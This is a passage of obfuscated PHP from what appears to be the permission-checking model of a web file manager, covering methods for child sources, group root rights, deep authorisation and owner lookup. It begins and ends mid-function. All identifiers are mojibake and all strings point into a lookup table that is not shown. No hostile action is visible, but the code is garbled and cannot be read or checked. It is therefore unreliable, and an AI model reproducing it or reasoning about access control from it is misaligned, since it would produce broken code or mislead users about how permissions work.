$ÈÚĞ•ª±)))->delete(); return !0; } public function getAllChildren($”ÔÈ›’Í) { $È‚õ¢Û =& $_SERVER[¥ÙÌÜ¾ê]; $ã²ëü› = Model($È‚õ¢Û[1253])->sourceInfo($”ÔÈ›’Í); if ($ã²ëü›[$È‚õ¢Û[405]] != $È‚õ¢Û[87]) { return $this->sourceListAuth(array($”ÔÈ›’Í)); } if ($ã²ëü›[$È‚õ¢Û[406]] != SourceModel::TYPE_GROUP) { return array(); } $Ä„÷ùÇÌ = 1; $İÚ¬åñ = array($”ÔÈ›’Í); if ($ã²ëü›[$È‚õ¢Û[492]] == $È‚õ¢Û[191] && $ã²ëü›[$È‚õ¢Û[498]] != $Ä„÷ùÇÌ) { $İÚ¬åñ = $this->groupChidldAllRootSource($ã²ëü›[$È‚õ¢Û[498]]); } $Ø¿Î¹‘” = $this->field($È‚õ¢Û[397])->group($È‚õ¢Û[397])->select(); $Ø¿Î¹‘” = array_to_keyvalue($Ø¿Î¹‘”, $È‚õ¢Û[33], $È‚õ¢Û[397]); if (!$Ø¿Î¹‘”) { return array(); } $‰ŒµÍè = $È‚õ¢Û[1925]; $‘Çó«»¯ = array($È‚õ¢Û[397] => array($È‚õ¢Û[7], $Ø¿Î¹‘”), $È‚õ¢Û[425] => $È‚õ¢Û[191]); $¦ˆĞ¹Ç× = Model($È‚õ¢Û[825])->field($‰ŒµÍè)->where($‘Çó«»¯)->select(); $ùù¦Àì¡ = array($”ÔÈ›’Í); foreach ($¦ˆĞ¹Ç× as $º®ˆĞ‚ó) { foreach ($İÚ¬åñ as $ùøŒª) { $–¥ÉÙÁ = $È‚õ¢Û[47] . $ùøŒª . $È‚õ¢Û[47]; $Şİ·°úá = $º®ˆĞ‚ó[$È‚õ¢Û[515]] . $º®ˆĞ‚ó[$È‚õ¢Û[397]] . $È‚õ¢Û[47]; if (strstr($Şİ·°úá, $–¥ÉÙÁ)) { $ùù¦Àì¡[] = $º®ˆĞ‚ó[$È‚õ¢Û[397]]; break; } } } return $this->sourceListAuth($ùù¦Àì¡); } private function sourceListAuth($ĞéÔ™–Ó) { $Á¥—Óäí =& $_SERVER[¥ÙÌÜ¾ê]; $Î©çŞÆ§ = Model($Á¥—Óäí[1253])->sourceListInfo($ĞéÔ™–Ó, !0); $¥Êıï¼ = $this->sourceAuthSelect($ĞéÔ™–Ó); $Ô–ÇªË© = array(); $ÓÖ˜æôü = array(); foreach ($Î©çŞÆ§ as $Á¢­âÈ­) { unset($Á¢­âÈ­[$Á¥—Óäí[448]]); unset($Á¢­âÈ­[$Á¥—Óäí[446]]); unset($Á¢­âÈ­[$Á¥—Óäí[408]]); unset($Á¢­âÈ­[$Á¥—Óäí[85]]); $ŒÍÑ«ƒª = $¥Êıï¼[$Á¢­âÈ­[$Á¥—Óäí[397]]]; if (!$ŒÍÑ«ƒª) { continue; } $Á¢­âÈ­[$Á¥—Óäí[1926]] = $this->authTargetInfo($ŒÍÑ«ƒª); $Á¢­âÈ­[$Á¥—Óäí[513]] = rtrim($Á¢­âÈ­[$Á¥—Óäí[519]], $Á¥—Óäí[8]) . $Á¥—Óäí[8] . ltrim($Á¢­âÈ­[$Á¥—Óäí[513]], $Á¥—Óäí[8]); $Ô–ÇªË©[] = $Á¢­âÈ­; $–à’û = count(explode($Á¥—Óäí[8], trim($Á¢­âÈ­[$Á¥—Óäí[513]], $Á¥—Óäí[8]))); $ÓÖ˜æôü[] = $–à’û + ($Á¢­âÈ­[$Á¥—Óäí[29]] == $Á¥—Óäí[77] ? 0 : 1000); } array_multisort($ÓÖ˜æôü, SORT_ASC, $Ô–ÇªË©); return $Ô–ÇªË©; } private function groupChidldAllRootSource($İÊû¡öã) { $±¯¡¡¿– =& $_SERVER[¥ÙÌÜ¾ê]; $·¸ÂÄ×Û = Model($±¯¡¡¿–[1927])->groupChildrenAll($İÊû¡öã); $è§”›ı = array($±¯¡¡¿–[492] => 0, $±¯¡¡¿–[498] => array($±¯¡¡¿–[7], $·¸ÂÄ×Û), $±¯¡¡¿–[406] => SourceModel::TYPE_GROUP); $å¾ó°û = Model($±¯¡¡¿–[825])->field($±¯¡¡¿–[397])->where($è§”›ı)->select(); $å¾ó°û = array_to_keyvalue($å¾ó°û, $±¯¡¡¿–[33], $±¯¡¡¿–[397]); return $å¾ó°û; } private function authTargetInfo($‹Ñµ»×Ë) { $Û™ÑÀÓœ =& $_SERVER[¥ÙÌÜ¾ê]; $²±âÒù– = array(); $’øãúöˆ = array(); $üÔşîòç = 2 << 25; foreach ($‹Ñµ»×Ë as $Ò½·­¢) { $‰¾İŠ°é = Model($Û™ÑÀÓœ[501])->listData($Ò½·­¢[$Û™ÑÀÓœ[1852]]); if (!$‰¾İŠ°é) { continue; } if ($Ò½·­¢[$Û™ÑÀÓœ[406]] == SourceModel::TYPE_USER) { $“¸Çâ’ = Model($Û™ÑÀÓœ[507])->getInfoSimpleOuter($Ò½·­¢[$Û™ÑÀÓœ[498]]); if ($“¸Çâ’[$Û™ÑÀÓœ[1581]] == $Û™ÑÀÓœ[1120]) { continue; } if ($“¸Çâ’[$Û™ÑÀÓœ[1581]] == $Û™ÑÀÓœ[191]) { $“¸Çâ’[$Û™ÑÀÓœ[28]] = LNG($Û™ÑÀÓœ[1928]); } } else { $“¸Çâ’ = Model($Û™ÑÀÓœ[516])->getInfoSimple($Ò½·­¢[$Û™ÑÀÓœ[498]]); } if (!$“¸Çâ’) { continue; } $“¸Çâ’[$Û™ÑÀÓœ[460]] = $‰¾İŠ°é; $²±âÒù–[] = $“¸Çâ’; $ÍØŞÜ—í = 0; if ($Ò½·­¢[$Û™ÑÀÓœ[406]] == SourceModel::TYPE_GROUP) { $ÍØŞÜ—í = $üÔşîòç * 2; } if ($Ò½·­¢[$Û™ÑÀÓœ[406]] == SourceModel::TYPE_USER) { $ÍØŞÜ—í = $üÔşîòç; } if ($Ò½·­¢[$Û™ÑÀÓœ[406]] == SourceModel::TYPE_USER && $Ò½·­¢[$Û™ÑÀÓœ[498]] == $Û™ÑÀÓœ[191]) { $ÍØŞÜ—í = 0; } $’øãúöˆ[] = $‰¾İŠ°é[$Û™ÑÀÓœ[408]] + $ÍØŞÜ—í; } array_multisort($’øãúöˆ, SORT_DESC, $²±âÒù–); return $²±âÒù–; } public function getAllChildrenByUser($ËÆÌıô², $íñ´ºœ‘) { $‡¨…”â‚ =& $_SERVER[¥ÙÌÜ¾ê]; $²ˆ°Ù¥À = Model($‡¨…”â‚[532])->getInfo($íñ´ºœ‘); if (!$íñ´ºœ‘ || !$ËÆÌıô² || !$²ˆ°Ù¥À) { return array(); } $—©ëôÏş = Model($‡¨…”â‚[1253])->sourceInfo($ËÆÌıô²); $”áÎ¥ûŸ = array(); $˜Ö¾èÀÓ = 1; if ($—©ëôÏş[$‡¨…”â‚[492]] == $‡¨…”â‚[191] && $—©ëôÏş[$‡¨…”â‚[498]] != $˜Ö¾èÀÓ && $this->groupContainUser($—©ëôÏş[$‡¨…”â‚[498]], $íñ´ºœ‘)) { foreach ($²ˆ°Ù¥À[$‡¨…”â‚[1929]] as $Œüªû‰) { $š”á¡ù÷ = Model($‡¨…”â‚[516])->getInfo($Œüªû‰[$‡¨…”â‚[1749]]); $ÒÛÆÎ¤˜ = Model($‡¨…”â‚[532])->getInfoSimpleOuter($íñ´ºœ‘); $ÒÛÆÎ¤˜[$‡¨…”â‚[460]] = $Œüªû‰[$‡¨…”â‚[408]]; if (Model($‡¨…”â‚[501])->authCheckAction($Œüªû‰[$‡¨…”â‚[408]][$‡¨…”â‚[408]], $‡¨…”â‚[1769])) { continue; } $¾äğ„‹ = array($‡¨…”â‚[28] => $‡¨…”â‚[1530] . $š”á¡ù÷[$‡¨…”â‚[28]], $‡¨…”â‚[397] => $š”á¡ù÷[$‡¨…”â‚[85]][$‡¨…”â‚[397]], $‡¨…”â‚[76] => KodIO::make($š”á¡ù÷[$‡¨…”â‚[85]][$‡¨…”â‚[397]]), $‡¨…”â‚[492] => $‡¨…”â‚[191], $‡¨…”â‚[406] => $‡¨…”â‚[509], $‡¨…”â‚[29] => $‡¨…”â‚[542], $‡¨…”â‚[513] => $š”á¡ù÷[$‡¨…”â‚[520]], $‡¨…”â‚[1749] => $š”á¡ù÷[$‡¨…”â‚[1749]], $‡¨…”â‚[517] => $š”á¡ù÷[$‡¨…”â‚[492]], $‡¨…”â‚[1926] => array($ÒÛÆÎ¤˜)); $”áÎ¥ûŸ[$¾äğ„‹[$‡¨…”â‚[397]]] = $¾äğ„‹; } } $òê¦¦¶Ö = array(); $ÑõÂÕø = $this->getAllChildren($ËÆÌıô²); foreach ($ÑõÂÕø as $‚Ğ¡Îéõ) { $ÎÏ¨òı¢ = !1; foreach ($‚Ğ¡Îéõ[$‡¨…”â‚[1926]] as $úŠŞ“ø) { if ($úŠŞ“ø[$‡¨…”â‚[1581]]) { if ($úŠŞ“ø[$‡¨…”â‚[1581]] == $íñ´ºœ‘) { $ÎÏ¨òı¢ = !0; break; } } if ($úŠŞ“ø[$‡¨…”â‚[1749]]) { if ($this->groupContainUser($úŠŞ“ø[$‡¨…”â‚[1749]], $íñ´ºœ‘)) { $ÎÏ¨òı¢ = !0; break; } } } if ($ÎÏ¨òı¢) { $òê¦¦¶Ö[] = $‚Ğ¡Îéõ; } $¥¤·¢Š‰ = $‚Ğ¡Îéõ[$‡¨…”â‚[397]]; if (isset($”áÎ¥ûŸ[$¥¤·¢Š‰])) { $‚Ğ¡Îéõ[$‡¨…”â‚[1926]][] = $”áÎ¥ûŸ[$¥¤·¢Š‰][0]; $”áÎ¥ûŸ[$¥¤·¢Š‰] = !1; } } $”áÎ¥ûŸ = array_filter(array_values($”áÎ¥ûŸ)); $òê¦¦¶Ö = array_merge($”áÎ¥ûŸ, $òê¦¦¶Ö); return $òê¦¦¶Ö; } public function setAllChildrenByUser($¦²êÃ«¾, $³‹õªóÃ, $Û¾·êú) { $øšÇ£Ô  =& $_SERVER[¥ÙÌÜ¾ê]; $š“ûè± = $this->getAllChildrenByUser($¦²êÃ«¾, $³‹õªóÃ); if (!$Û¾·êú || !$š“ûè±) { return !1; } foreach ($š“ûè± as $æÜµ¸¨¬) { $ì­ğ§Ê = array(); foreach ($æÜµ¸¨¬[$øšÇ£Ô [1926]] as $ßÚÇì‰é) { $»¥ìŒû = $ßÚÇì‰é[$øšÇ£Ô [460]]; $ÂÛ¦—¬Å = $ßÚÇì‰é[$øšÇ£Ô [1581]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‡­’Ğå¡ = $ßÚÇì‰é[$øšÇ£Ô [1581]] ? $ßÚÇì‰é[$øšÇ£Ô [1581]] : $ßÚÇì‰é[$øšÇ£Ô [1749]]; if ($ßÚÇì‰é[$øšÇ£Ô [1581]] && $ßÚÇì‰é[$øšÇ£Ô [1581]] == $³‹õªóÃ) { continue; } $ì­ğ§Ê[] = array($øšÇ£Ô [397] => $æÜµ¸¨¬[$øšÇ£Ô [397]], $øšÇ£Ô [406] => $ÂÛ¦—¬Å, $øšÇ£Ô [498] => intval($‡­’Ğå¡), $øšÇ£Ô [1852] => isset($»¥ìŒû[$øšÇ£Ô [395]]) ? intval($»¥ìŒû[$øšÇ£Ô [395]]) : 0, $øšÇ£Ô [1906] => isset($»¥ìŒû[$øšÇ£Ô [1906]]) ? intval($»¥ìŒû[$øšÇ£Ô [1906]]) : -1); } $ì­ğ§Ê[] = array($øšÇ£Ô [397] => $æÜµ¸¨¬[$øšÇ£Ô [397]], $øšÇ£Ô [406] => SourceModel::TYPE_USER, $øšÇ£Ô [498] => intval($³‹õªóÃ), $øšÇ£Ô [1852] => intval($Û¾·êú), $øšÇ£Ô [1906] => -1); $this->where(array($øšÇ£Ô [412] => $æÜµ¸¨¬[$øšÇ£Ô [397]]))->delete(); $this->addAll($ì­ğ§Ê); } return !0; } public function get($éúÀÍ½) { $®î¶³š = $this->getSourceList(array($éúÀÍ½), !0); return $®î¶³š[0]; } public function getSourceList($úÙ÷ŞéÏ, $·áƒÅÈ = false, $ßü®ÚœÈ = false) { $Û‡·ó‡„ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$úÙ÷ŞéÏ) { return array(); } $™•Ë„ÌÛ = Model($Û‡·ó‡„[1253]); if (!$·áƒÅÈ && count($úÙ÷ŞéÏ) == 1) { $·áƒÅÈ = array(); $·áƒÅÈ[$úÙ÷ŞéÏ[0]] = $™•Ë„ÌÛ->sourceInfo($úÙ÷ŞéÏ[0]); } if (!$·áƒÅÈ) { $êÕû¿ôé = array($Û‡·ó‡„[412] => array($Û‡·ó‡„[413], $úÙ÷ŞéÏ)); $·áƒÅÈ = $™•Ë„ÌÛ->field($Û‡·ó‡„[1930])->where($êÕû¿ôé)->select(); $·áƒÅÈ = array_to_keyvalue($·áƒÅÈ, $Û‡·ó‡„[397]); } $â©ÌÍ¬Ô = $úÙ÷ŞéÏ; foreach ($·áƒÅÈ as $˜ıÍ°Ù => $³¶õ½¹Ç) { $Éı³Ïç = $™•Ë„ÌÛ->parentLevelArray($³¶õ½¹Ç[$Û‡·ó‡„[515]]); $â©ÌÍ¬Ô = array_merge($â©ÌÍ¬Ô, array($˜ıÍ°Ù), array_reverse($Éı³Ïç)); } $â©ÌÍ¬Ô = array_values(array_unique($â©ÌÍ¬Ô)); if (!$â©ÌÍ¬Ô) { return array(); } $€ÒÀ³ÌŒ = $this->sourceAuthSelect($â©ÌÍ¬Ô); $¶ª”¨‰è = array(); foreach ($â©ÌÍ¬Ô as $•¬–¾¸š) { if (isset($€ÒÀ³ÌŒ[$•¬–¾¸š])) { $¶ª”¨‰è[$•¬–¾¸š] = $€ÒÀ³ÌŒ[$•¬–¾¸š]; } } $¢Ğ˜²ô = $this->userIsRoot($ßü®ÚœÈ); $¹š¤Ì¥ = AuthModel::authAll(); $„ËûêÒÑ = array($Û‡·ó‡„[409] => $¹š¤Ì¥, $Û‡·ó‡„[1931] => array($Û‡·ó‡„[414] => 0, $Û‡·ó‡„[1755] => $¹š¤Ì¥, $Û‡·ó‡„[415] => LNG($Û‡·ó‡„[1932]), $Û‡·ó‡„[1771] => $Û‡·ó‡„[1933])); $üƒ„Íğü = array(); foreach ($·áƒÅÈ as $•¬–¾¸š => $’€åÇ°) { if ($¢Ğ˜²ô) { $üƒ„Íğü[$•¬–¾¸š] = $„ËûêÒÑ; continue; } $üƒ„Íğü[$•¬–¾¸š] = $this->makeSourceAuth($’€åÇ°, $¶ª”¨‰è, $ßü®ÚœÈ); } return $üƒ„Íğü; } public function authDeepCheck($±ç—¥Á, $ÀšøœØò = false) { $›§úøÖÈ =& $_SERVER[¥ÙÌÜ¾ê]; $ÀšøœØò = $ÀšøœØò ? $ÀšøœØò : USER_ID; $çš‚¤¤Ç = $this->makeAuthDeep($ÀšøœØò); if (!in_array($±ç—¥Á, $çš‚¤¤Ç[$›§úøÖÈ[1934]])) { return !1; } $´®…¡¶å = array(); foreach ($çš‚¤¤Ç[$›§úøÖÈ[1935]] as $é•ƒƒõÖ => $ĞÒÖúÓ¨) { if (!in_array($±ç—¥Á, $ĞÒÖúÓ¨)) { continue; } $´®…¡¶å[] = $é•ƒƒõÖ; } if (!$´®…¡¶å) { return !1; } $å·Á§·Ø = $´®…¡¶å ? $´®…¡¶å[0] : $±ç—¥Á; return array($›§úøÖÈ[409] => -1, $›§úøÖÈ[460] => array($›§úøÖÈ[414] => $›§úøÖÈ[1120], $›§úøÖÈ[1755] => $›§úøÖÈ[191], $›§úøÖÈ[415] => LNG($›§úøÖÈ[1936]), $›§úøÖÈ[1771] => $›§úøÖÈ[1937]), $›§úøÖÈ[1938] => LNG($›§úøÖÈ[1939]), $›§úøÖÈ[1940] => $this->sourceAuthInfo($å·Á§·Ø)); } protected function makeAuthDeep($«‚¢ = false) { $æÎÆ™® =& $_SERVER[¥ÙÌÜ¾ê]; static $Ø±€¹Ó = array(); $«‚¢ = $«‚¢ ? $«‚¢ : USER_ID; if (isset($Ø±€¹Ó[$«‚¢])) { return $Ø±€¹Ó[$«‚¢]; } $ëÉ¸´Ú‰ = Model($æÎÆ™®[1941])->listData(); $Ÿø—€ã÷ = array(); foreach ($ëÉ¸´Ú‰ as $äúüó›) { if ($äúüó›[$æÎÆ™®[408]] == 0 && $äúüó›[$æÎÆ™®[1770]] == $æÎÆ™®[87]) { $Ÿø—€ã÷[] = $äúüó›[$æÎÆ™®[395]]; } } $Ë‡ÜÚÊ¨ = $this->userGroupParents($«‚¢); $ÂÔòì¤ = array($æÎÆ™®[406] => SourceModel::TYPE_USER, $æÎÆ™®[498] => $«‚¢); if ($Ë‡ÜÚÊ¨) { $ÂÔòì¤ = array(array($æÎÆ™®[406] => SourceModel::TYPE_USER, $æÎÆ™®[498] => $«‚¢), array($æÎÆ™®[406] => SourceModel::TYPE_GROUP, $æÎÆ™®[498] => array($æÎÆ™®[413], $Ë‡ÜÚÊ¨)), $æÎÆ™®[996] => $æÎÆ™®[1844]); } $ÌÚäØª² = $this->field($æÎÆ™®[1942])->where($ÂÔòì¤)->select(); $ìÆˆ¡æó = array(); $¯Ÿ¦½á´ = array_to_keyvalue_group($ÌÚäØª², $æÎÆ™®[397]); foreach ($¯Ÿ¦½á´ as $îÕ¿üì” => $ö…³õÃñ) { $ıÌí¦í„ = $this->authArrayCheck($ö…³õÃñ, $«‚¢); if ($ıÌí¦í„[$æÎÆ™®[409]] > 0) { $ìÆˆ¡æó[] = $îÕ¿üì” . $æÎÆ™®[33]; } } $îœÍä´’ = array(); $ÀÓŞÔ‹¬ = $Ë‡ÜÚÊ¨; $²ÖÏï¹« = Model($æÎÆ™®[1253]); $î¢µ¸çà = Model($æÎÆ™®[516]); $şÕ¡¤Û§ = array(); $…€ï„òß = array(); $ùÕñŒ¼ï = array(); $Ğ¥ĞØÁ  = array(); if ($ìÆˆ¡æó) { $ùèÔŒÃÁ = $²ÖÏï¹«->where(array($æÎÆ™®[397] => array($æÎÆ™®[413], $ìÆˆ¡æó)))->select(); foreach ($ùèÔŒÃÁ as $‡îíÉªê) { $òí¸×¢ = $²ÖÏï¹«->parentLevelArray($‡îíÉªê[$æÎÆ™®[515]]); $îœÍä´’ = array_merge($îœÍä´’, $òí¸×¢); $ÀÓŞÔ‹¬[] = $‡îíÉªê[$æÎÆ™®[498]]; $şÕ¡¤Û§[$‡îíÉªê[$æÎÆ™®[397]]] = $òí¸×¢; $…€ï„òß[$‡îíÉªê[$æÎÆ™®[397]]] = $‡îíÉªê[$æÎÆ™®[498]]; } } $ÀÓŞÔ‹¬ = array_values(array_unique($ÀÓŞÔ‹¬)); $ŠëÔ¤ˆ¨ = $ÀÓŞÔ‹¬; foreach ($ŠëÔ¤ˆ¨ as $¦²Á×Òõ) { $“‘¥ñê† = $î¢µ¸çà->getInfo($¦²Á×Òõ); $òí¸×¢ = $²ÖÏï¹«->parentLevelArray($“‘¥ñê†[$æÎÆ™®[515]]); $ÀÓŞÔ‹¬ = array_merge($ÀÓŞÔ‹¬, $òí¸×¢); } $ÀÓŞÔ‹¬ = array_values(array_unique($ÀÓŞÔ‹¬)); foreach ($ÀÓŞÔ‹¬ as $¦²Á×Òõ) { $“‘¥ñê† = $î¢µ¸çà->getInfo($¦²Á×Òõ); $îœÍä´’[] = $“‘¥ñê†[$æÎÆ™®[85]][$æÎÆ™®[397]]; $ùÕñŒ¼ï[$¦²Á×Òõ] = $“‘¥ñê†[$æÎÆ™®[85]][$æÎÆ™®[397]]; $Ğ¥ĞØÁ [$¦²Á×Òõ] = $²ÖÏï¹«->parentLevelArray($“‘¥ñê†[$æÎÆ™®[515]]); } foreach ($şÕ¡¤Û§ as $ÎìÓç‚Ñ => $Íô§óİ‚) { $­ú¤ÌŠ‡ = $…€ï„òß[$ÎìÓç‚Ñ]; if (!$­ú¤ÌŠ‡ || !$ùÕñŒ¼ï[$­ú¤ÌŠ‡]) { continue; } $Âºó×ÎÀ = array(); foreach ($Ğ¥ĞØÁ [$­ú¤ÌŠ‡] as $¦²Á×Òõ) { $Âºó×ÎÀ[] = $ùÕñŒ¼ï[$¦²Á×Òõ]; } $şÕ¡¤Û§[$ÎìÓç‚Ñ] = array_merge($Âºó×ÎÀ, $Íô§óİ‚); } $îœÍä´’ = array_values(array_unique($îœÍä´’)); $®¿½¹àê = array($æÎÆ™®[1934] => $îœÍä´’, $æÎÆ™®[1935] => $şÕ¡¤Û§); $Ø±€¹Ó[$«‚¢] = $®¿½¹àê; return $®¿½¹àê; } private function makeSourceAuth($šäû¬Ö¢, $ÉÕöÏ , $¬¯¿‹Ş‹ = false) { $”ø§Òƒ =& $_SERVER[¥ÙÌÜ¾ê]; $ÂÏÒ‡ = $”ø§Òƒ[87]; $¡¾¶¥Œ = $šäû¬Ö¢[$”ø§Òƒ[498]]; $üßìÑ = $šäû¬Ö¢[$”ø§Òƒ[406]] == SourceModel::TYPE_GROUP; $ü„„ª¡Á = $üßìÑ ? $this->groupRootAuth($¡¾¶¥Œ, $¬¯¿‹Ş‹) : !1; if ($ü„„ª¡Á && Model($”ø§Òƒ[501])->authCheckAction($ü„„ª¡Á[$”ø§Òƒ[408]], $”ø§Òƒ[1769])) { return $this->groupAuthInfo($ü„„ª¡Á, $¡¾¶¥Œ); } $°÷†Šµ = Model($”ø§Òƒ[1253])->parentLevelArray($šäû¬Ö¢[$”ø§Òƒ[515]]); $°÷†Šµ = array_merge(array($šäû¬Ö¢[$”ø§Òƒ[397]]), array_reverse($°÷†Šµ)); $ËÕ‡®ú = !1; foreach ($°÷†Šµ as $¶û¼ë¬ç) { if (!isset($ÉÕöÏ [$¶û¼ë¬ç])) { continue; } $Î¹öáÉé = $this->authMake($ÉÕöÏ [$¶û¼ë¬ç], $¬¯¿‹Ş‹); if ($Î¹öáÉé[$”ø§Òƒ[460]]) { $ËÕ‡®ú = $Î¹öáÉé; break; } } if (!$üßìÑ) { return $ËÕ‡®ú; } if (!$ËÕ‡®ú && $ü„„ª¡Á) { $ËÕ‡®ú = $this->groupAuthInfo($ü„„ª¡Á, $¡¾¶¥Œ); } if (!$ËÕ‡®ú) { $íóò†â¢ = Model($”ø§Òƒ[516])->getInfo($¡¾¶¥Œ); $¨õ—Õï¡ = explode($”ø§Òƒ[47], trim($íóò†â¢[$”ø§Òƒ[515]], $”ø§Òƒ[47])); $¨õ—Õï¡ = array_reverse($¨õ—Õï¡); foreach ($¨õ—Õï¡ as $ºí«‹) { if ($ºí«‹ == $”ø§Òƒ[191] || $ºí«‹ == $ÂÏÒ‡) { continue; } $±¸ŒÚ¶¡ = $this->groupRootAuth($ºí«‹, $¬¯¿‹Ş‹); if (!$±¸ŒÚ¶¡) { continue; } $ËÕ‡®ú = $this->groupAuthInfo($±¸ŒÚ¶¡, $ºí«‹); break; } } if (!$ËÕ‡®ú || $ËÕ‡®ú[$”ø§Òƒ[409]] <= 0) { $Š×µİÀ… = $this->authDeepCheck($šäû¬Ö¢[$”ø§Òƒ[397]], $¬¯¿‹Ş‹); if ($Š×µİÀ…) { $ËÕ‡®ú = $Š×µİÀ…; } } return $ËÕ‡®ú; } private function userIsRoot($§ãã÷²Ğ = false) { $âÚ±Ó =& $_SERVER[¥ÙÌÜ¾ê]; if (!$§ãã÷²Ğ && _get($GLOBALS, $âÚ±Ó[499])) { return !0; } $ñıİó» = Model($âÚ±Ó[532])->getInfo($§ãã÷²Ğ); $’ÎÉì·Ú = Model($âÚ±Ó[1943])->listData($ñıİó»[$âÚ±Ó[1461]]); if ($’ÎÉì·Ú && $’ÎÉì·Ú[$âÚ±Ó[505]][$âÚ±Ó[1944]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ ¸æßñ) { $–Ô¢É‹¬ =& $_SERVER[¥ÙÌÜ¾ê]; $ÑÑÇôÃ¨ = Model($–Ô¢É‹¬[1253]); $ƒø´ı”ò = $ÑÑÇôÃ¨->sourceInfo($ ¸æßñ); if (!$ƒø´ı”ò) { return !1; } $ÑÑÇôÃ¨->groupPathDisplay($ƒø´ı”ò); $®“Ÿµúä = array($ƒø´ı”ò); $®“Ÿµúä = $ÑÑÇôÃ¨->_listAppendPath($®“Ÿµúä); $ƒø´ı”ò = $®“Ÿµúä[0]; $ÑÔ™ãÕÙ = $ƒø´ı”ò[$–Ô¢É‹¬[513]]; if (isset($ƒø´ı”ò[$–Ô¢É‹¬[521]])) { $»±ÀâêŒ = explode($–Ô¢É‹¬[8], trim($ƒø´ı”ò[$–Ô¢É‹¬[513]], $–Ô¢É‹¬[8])); array_shift($»±ÀâêŒ); $ÑÔ™ãÕÙ = $ƒø´ı”ò[$–Ô¢É‹¬[519]] . $–Ô¢É‹¬[1945] . implode($–Ô¢É‹¬[8], $»±ÀâêŒ); } return array($–Ô¢É‹¬[415] => $ƒø´ı”ò[$–Ô¢É‹¬[28]], $–Ô¢É‹¬[76] => KodIO::make($ƒø´ı”ò[$–Ô¢É‹¬[397]]), $–Ô¢É‹¬[1946] => $ÑÔ™ãÕÙ); } private function groupAuthInfo($ªÃß”“ˆ, $«ó’Á¾) { $µ®ú€¨É =& $_SERVER[¥ÙÌÜ¾ê]; $ı«ñÅƒÇ = Model($µ®ú€¨É[516])->getInfo($«ó’Á¾); return array($µ®ú€¨É[1947] => intval($ªÃß”“ˆ[$µ®ú€¨É[408]]), $µ®ú€¨É[1931] => $ªÃß”“ˆ, $µ®ú€¨É[1948] => LNG($µ®ú€¨É[1949]), $µ®ú€¨É[1940] => array($µ®ú€¨É[415] => $ı«ñÅƒÇ[$µ®ú€¨É[28]], $µ®ú€¨É[76] => KodIO::make($ı«ñÅƒÇ[$µ®ú€¨É[85]][$µ®ú€¨É[397]]), $µ®ú€¨É[1946] => $ı«ñÅƒÇ[$µ®ú€¨É[520]])); } protected function groupRootAuth($ü¶ìŠ¬‹, $Êå‹úÍ‚ = false) { $¿¶·‘¤ğ =& $_SERVER[¥ÙÌÜ¾ê]; $Êå‹úÍ‚ = $Êå‹úÍ‚ ? $Êå‹úÍ‚ : USER_ID; $ËçËÍ¡Ğ = $Êå‹úÍ‚ . $¿¶·‘¤ğ[1950] . $ü¶ìŠ¬‹; static $¥Ş´àó¦ = array(); if (isset($¥Ş´àó¦[$ËçËÍ¡Ğ])) { return $¥Ş´àó¦[$ËçËÍ¡Ğ]; } $úíªËÄİ = Model($¿¶·‘¤ğ[516])->getInfo($ü¶ìŠ¬‹); $•õÕ“è = $this->userGroupList($Êå‹úÍ‚); $úÎ¥Ù»ß = isset($•õÕ“è[$ü¶ìŠ¬‹]) ? $•õÕ“è[$ü¶ìŠ¬‹][$¿¶·‘¤ğ[408]] : !1; if ($úÎ¥Ù»ß && Model($¿¶·‘¤ğ[501])->authCheckAction($úÎ¥Ù»ß[$¿¶·‘¤ğ[408]], $¿¶·‘¤ğ[1769])) { $¥Ş´àó¦[$ËçËÍ¡Ğ] = $úÎ¥Ù»ß; return $úÎ¥Ù»ß; } $€ÙÉØÁ§ = $this->sourceAuthSelect($úíªËÄİ[$¿¶·‘¤ğ[85]][$¿¶·‘¤ğ[397]]); $Û³Á££¸ = $€ÙÉØÁ§ ? $this->authMake($€ÙÉØÁ§, $Êå‹úÍ‚) : !1; $ı•å÷µ³ = $Û³Á££¸ ? $Û³Á££¸[$¿¶·‘¤ğ[460]] : !1; $¥Ş´àó¦[$ËçËÍ¡Ğ] = $ı•å÷µ³ ? $ı•å÷µ³ : $úÎ¥Ù»ß; return $¥Ş´àó¦[$ËçËÍ¡Ğ]; } public function authOwnerApply($‡¯Êü¡õ) { $¦½‚ˆà =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($‡¯Êü¡õ[$¦½‚ˆà[408]]) || isset($‡¯Êü¡õ[$¦½‚ˆà[1951]]) && $‡¯Êü¡õ[$¦½‚ˆà[1951]]) { return $‡¯Êü¡õ; } if (AuthModel::authCheckRoot($‡¯Êü¡õ[$¦½‚ˆà[408]][$¦½‚ˆà[409]])) { return $‡¯Êü¡õ; } $¢ï¼ÙŠ = Model($¦½‚ˆà[1253])->parentLevelArray($‡¯Êü¡õ[$¦½‚ˆà[515]]); $¢ï¼ÙŠ = array_merge(array($‡¯Êü¡õ[$¦½‚ˆà[397]]), array_reverse($¢ï¼ÙŠ)); $ï…£ûš¸ = $this->sourceAuthSelect($¢ï¼ÙŠ); $·ù†£Ôí = array(); $ï­»ëîé = array(); foreach ($ï…£ûš¸ as $ÊÈ½š¦• => $½…§‡ı’) { $ÏÁëù¢ = $this->authFolderOwnerUser($½…§‡ı’); $·ù†£Ôí[$ÊÈ½š¦•] = $ÏÁëù¢; $ï­»ëîé = array_merge($ï­»ëîé, $ÏÁëù¢[$¦½‚ˆà[588]]); if ($ÏÁëù¢[$¦½‚ˆà[1952]]) { break; } } if (count($ï­»ëîé) == 0) { $ï­»ëîé = $this->authFolderOwnerGroup($‡¯Êü¡õ[$¦½‚ˆà[498]]); } $ï­»ëîé = array_unique($ï­»ëîé); if (AuthModel::authCheckRoot($‡¯Êü¡õ[$¦½‚ˆà[408]][$¦½‚ˆà[409]])) { $ï­»ëîé[] = USER_ID; } $‡¯Êü¡õ[$¦½‚ˆà[408]][$¦½‚ˆà[1953]] = Model($¦½‚ˆà[507])->userListInfo($ï­»ëîé); return $‡¯Êü¡õ; } private function authFolderOwnerGroup($ÕÂ‚ÇåÚ) { $áµ›ñö =& $_SERVER[¥ÙÌÜ¾ê]; $ºùºÕ† = Model($áµ›ñö[1838])->where(array($áµ›ñö[1749] => $ÕÂ‚ÇåÚ))->select(); $”êş· ¬ = array(); if (!$ºùºÕ†) { return $”êş· ¬; } foreach ($ºùºÕ† as $è¿¾¬ûÙ) { $åò­üòæ = $this->authInfo($è¿¾¬ûÙ); if 